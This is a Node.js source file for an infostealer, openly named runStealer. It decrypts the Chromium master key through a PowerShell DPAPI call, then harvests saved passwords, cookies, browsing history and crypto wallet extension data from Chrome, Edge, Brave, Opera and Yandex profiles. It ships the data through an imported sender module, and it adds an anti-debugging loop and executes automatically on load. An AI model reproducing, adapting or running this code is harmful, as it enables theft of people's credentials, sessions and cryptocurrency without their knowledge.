"use strict";

const fs = require("fs");
const path = require("path");
const os = require("os");
const sqlite3 = require("sqlite3");
const crypto = require("crypto");
const child_process = require("child_process");
const apiSender = require("./api");

const globalMasterKeyCache = {};

async function getMasterKey(browserUserDataPath) {
  if (globalMasterKeyCache[browserUserDataPath]) {
    return globalMasterKeyCache[browserUserDataPath];
  }

  const localStatePath = path.join(browserUserDataPath, "Local State");
  if (!fs.existsSync(localStatePath)) return null;

  try {
    const localState = JSON.parse(fs.readFileSync(localStatePath, "utf8"));
    const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, "base64").slice(5);
    
    const decryptedKey = child_process.execSync(
      `powershell.exe -ExecutionPolicy Bypass -Command "[System.Security.Cryptography.ProtectedData]::Unprotect([System.Convert]::FromBase64String('${encryptedKey.toString("base64")}'), $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)"`,
      { encoding: "base64" }
    );

    const masterKey = Buffer.from(decryptedKey, "base64");
    globalMasterKeyCache[browserUserDataPath] = masterKey;
    return masterKey;
  } catch (e) {
    return null;
  }
}

function decryptAES(data, masterKey) {
  try {
    const iv = data.slice(3, 15);
    const payload = data.slice(15, data.length - 16);
    const authTag = data.slice(data.length - 16);
    const decipher = crypto.createDecipheriv("aes-256-gcm", masterKey, iv);
    decipher.setAuthTag(authTag);
    return Buffer.concat([decipher.update(payload), decipher.final()]).toString();
  } catch (e) {
    return "";
  }
}

async function getPasswords(profilePath, masterKey) {
  const dbPath = path.join(profilePath, "Login Data");
  if (!fs.existsSync(dbPath)) return [];

  const tempPath = path.join(os.tmpdir(), `pass_${Date.now()}`);
  fs.copyFileSync(dbPath, tempPath);

  const db = new sqlite3.Database(tempPath);
  return new Promise((resolve) => {
    db.all("SELECT origin_url, username_value, password_value FROM logins", (err, rows) => {
      const results = [];
      if (!err && rows) {
        rows.forEach((row) => {
          const password = decryptAES(row.password_value, masterKey);
          if (password) {
            results.push(`URL: ${row.origin_url} | User: ${row.username_value} | Pass: ${password}`);
          }
        });
      }
      db.close();
      fs.unlinkSync(tempPath);
      resolve(results);
    });
  });
}

async function getCookies(profilePath, masterKey) {
  const dbPaths = [
    path.join(profilePath, "Cookies"),
    path.join(profilePath, "Network", "Cookies")
  ];
  const dbPath = dbPaths.find(p => fs.existsSync(p));
  if (!dbPath) return [];

  const tempPath = path.join(os.tmpdir(), `cook_${Date.now()}`);
  fs.copyFileSync(dbPath, tempPath);

  const db = new sqlite3.Database(tempPath);
  return new Promise((resolve) => {
    db.all("SELECT host_key, name, path, encrypted_value, expires_utc, is_secure FROM cookies", (err, rows) => {
      const results = [];
      if (!err && rows) {
        rows.forEach((row) => {
          const value = decryptAES(row.encrypted_value, masterKey);
          const expiry = Math.floor(row.expires_utc / 1000000) - 11644473600;
          results.push([row.host_key, "TRUE", row.path, row.is_secure ? "TRUE" : "FALSE", expiry, row.name, value].join("\t"));
        });
      }
      db.close();
      fs.unlinkSync(tempPath);
      resolve(results);
    });
  });
}

async function getHistory(profilePath) {
  const dbPath = path.join(profilePath, "History");
  if (!fs.existsSync(dbPath)) return [];

  const tempPath = path.join(os.tmpdir(), `hist_${Date.now()}`);
  fs.copyFileSync(dbPath, tempPath);

  const db = new sqlite3.Database(tempPath);
  return new Promise((resolve) => {
    db.all("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500", (err, rows) => {
      const results = [];
      if (!err && rows) {
        rows.forEach((row) => {
          const date = new Date((row.last_visit_time / 1000000) - 11644473600 * 1000);
          results.push(`URL: ${row.url} | Title: ${row.title} | Date: ${date.toISOString()}`);
        });
      }
      db.close();
      fs.unlinkSync(tempPath);
      resolve(results);
    });
  });
}

async function getWallets(profilePath) {
  const walletMap = {
    "Metamask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
    "Binance": "fhbohimaelbohpkkcclbhfhjffoldjji",
    "Phantom": "bfnaoomephehponehpborehbhbhbhbhb",
    "Coinbase": "hnfanknocfeofbddgcijnmhnfnkdnoad"
  };

  const found = [];
  const extPath = path.join(profilePath, "Local Extension Settings");
  if (fs.existsSync(extPath)) {
    for (const [name, id] of Object.entries(walletMap)) {
      const fullPath = path.join(extPath, id);
      if (fs.existsSync(fullPath)) {
        found.push({ name, id, path: fullPath });
      }
    }
  }
  return found;
}

async function runStealer() {
  const browserList = [
    { name: "Chrome", path: "Google/Chrome/User Data" },
    { name: "Edge", path: "Microsoft/Edge/User Data" },
    { name: "Brave", path: "BraveSoftware/Brave-Browser/User Data" },
    { name: "Opera", path: "Opera Software/Opera Stable" },
    { name: "Yandex", path: "Yandex/YandexBrowser/User Data" }
  ];

  for (const browser of browserList) {
    const userDataPath = path.join(os.homedir(), "AppData/Local", browser.path);
    const masterKey = await getMasterKey(userDataPath);
    if (!masterKey) continue;

    const profiles = ["Default", "Profile 1", "Profile 2", "Profile 3"];
    for (const profile of profiles) {
      const profilePath = path.join(userDataPath, profile);
      if (!fs.existsSync(profilePath)) continue;

      const data = {
        browser: browser.name,
        profile: profile,
        passwords: await getPasswords(profilePath, masterKey),
        cookies: await getCookies(profilePath, masterKey),
        history: await getHistory(profilePath),
        wallets: await getWallets(profilePath)
      };

      if (data.passwords.length > 0 || data.cookies.length > 0) {
        await apiSender.sendGenericMessage(data);
      }
    }
  }
}

(function antiAnalysis() {
  setInterval(() => {
    (function() {}).constructor("debugger").call("action");
  }, 4000);
})();

runStealer().catch(() => {});

module.exports = { runStealer };
